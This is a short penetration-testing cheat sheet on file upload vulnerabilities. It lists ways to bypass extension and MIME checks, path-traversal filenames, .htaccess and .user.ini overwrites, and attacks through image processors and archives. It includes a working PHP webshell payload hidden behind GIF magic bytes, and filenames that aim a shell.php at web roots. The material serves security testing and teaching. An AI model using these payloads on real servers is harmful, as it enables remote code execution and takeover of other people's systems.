# File Upload Vulnerabilities Reference

## Attack Surface Signals
- File upload forms: Avatars, attachments, document uploads, media processing, import tools.
- Parameters: `multipart/form-data` with `filename="malicious.php"`, `Content-Type: image/jpeg`.

## Attack Vectors & Bypass Techniques
1. **Extension & Suffix Bypasses**:
   - Alternative extensions: `.php5`, `.phtml`, `.phar`, `.php7`, `.pht`, `.jspx`, `.ashx`, `.config`.
   - Case modification: `.pHp`, `.PhP`, `.ASPX`.
   - Double / trailing extensions: `file.php.jpg`, `file.php.`, `file.php%00.jpg`, `file.php::$DATA` (Windows).
2. **MIME-Type & Magic Byte Manipulation**:
   - Set `Content-Type: image/png` or `image/jpeg`.
   - Add valid magic bytes to payload: `GIF89a;<?php system($_GET['c']); ?>` or PNG/JPG header prepended.
3. **Path Traversal in Filename**:
   - `filename="../../../var/www/html/shell.php"`
   - `filename="..\..\inetpub\wwwroot\shell.aspx"`
4. **Server Configuration Overwrite**:
   - Upload `.htaccess` with `AddType application/x-httpd-php .custom` or `.user.ini` pointing `auto_prepend_file=shell.png`.
5. **Secondary Processor Exploits**:
   - **ImageMagick (ImageTragick)**: Upload `.mvg` / `.msl` files triggering command execution.
   - **SVG Stored XSS / SSRF / XXE**: XML payloads embedded inside `.svg` vector files.
   - **Archive Extraction (Zip Slip)**: Upload `.zip` containing `../../shell.php` paths.

## Exploit Chains
- **File Upload → Webshell → Remote Code Execution**.
- **SVG Upload → Stored XSS → Admin Session Hijacking**.
- **Polyglot File Upload → XXE / SSRF via Backend Conversion Pipeline**.
